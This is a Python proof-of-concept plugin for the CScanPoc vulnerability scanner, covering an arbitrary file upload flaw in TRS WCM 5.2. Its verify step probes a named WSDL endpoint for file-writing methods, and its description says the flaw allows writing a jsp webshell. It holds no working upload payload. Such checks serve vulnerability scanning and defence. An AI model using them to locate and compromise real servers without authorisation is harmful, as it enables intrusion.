# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TRS_WCM_0001' # 平台漏洞编号，留空
    name = 'TRS WCM5.2 任意文件上传漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-01-16'  # 漏洞公布时间
    desc = '''
        漏洞影响版本WCM5.2，其他版本未测试。
        TRS WCM的Web Service提供了向服务器写入文件的方式，可以直接写jsp文件获取webshell。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-89487'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'TRS WCM'  # 漏洞应用名称
    product_version = '5.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'caba5504-835a-42a4-a3a2-ebb8f013990e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2015-092138
            payload = '/wcm/services/trs:templateservicefacade?wsdl'
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl2(url)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'writeFile' in r.content and 'writeSpecFile' in r.content:
                #security_hole('<WCM> getshell '+ arg + payload) 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
